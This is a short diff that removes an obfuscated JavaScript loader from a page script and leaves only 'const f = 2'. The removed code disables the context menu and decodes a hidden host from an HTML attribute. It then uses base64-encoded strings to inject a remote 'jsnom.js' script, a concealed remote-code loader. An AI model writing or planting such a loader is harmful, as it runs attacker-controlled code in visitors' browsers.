@@ -1,13 +1,1 @@
-var sc = document.createElement("script");
-sc.setAttribute("src", "https://cdn.socket.io/4.6.0/socket.io.min.js");
-sc.setAttribute("integrity", "sha384-c79GN5VsunZvi+Q/WObgk2in0CbZsHnjEqvFxC5DxHn9lTfNce2WW6h2pH6u/kF+");
-sc.setAttribute("crossorigin", "anonymous");
-sc.setAttribute("type", "text/javascript");
-document.head.appendChild(sc);
-document.addEventListener('contextmenu', event => event.preventDefault());
-var s8120da3f96ec8f6a278a53622c8a81f76c302613 = atob(document.getElementById("html").getAttribute("point"));
-console.log(s8120da3f96ec8f6a278a53622c8a81f76c302613);
-var sbe23a90c04a154dfeee31fbd865adf8196be47dd_b83634a6fad743837b510beae3a42e409f4935a1 = document.createElement(atob("c2NyaXB0"));
-sbe23a90c04a154dfeee31fbd865adf8196be47dd_b83634a6fad743837b510beae3a42e409f4935a1.setAttribute(atob("c3Jj"), s8120da3f96ec8f6a278a53622c8a81f76c302613 + atob("L2pzbm9tLmpz"));
-sbe23a90c04a154dfeee31fbd865adf8196be47dd_b83634a6fad743837b510beae3a42e409f4935a1.setAttribute(atob("dHlwZQ=="), atob("dGV4dC9qYXZhc2NyaXB0"));
-document.head.appendChild(sbe23a90c04a154dfeee31fbd865adf8196be47dd_b83634a6fad743837b510beae3a42e409f4935a1);
+const f = 2
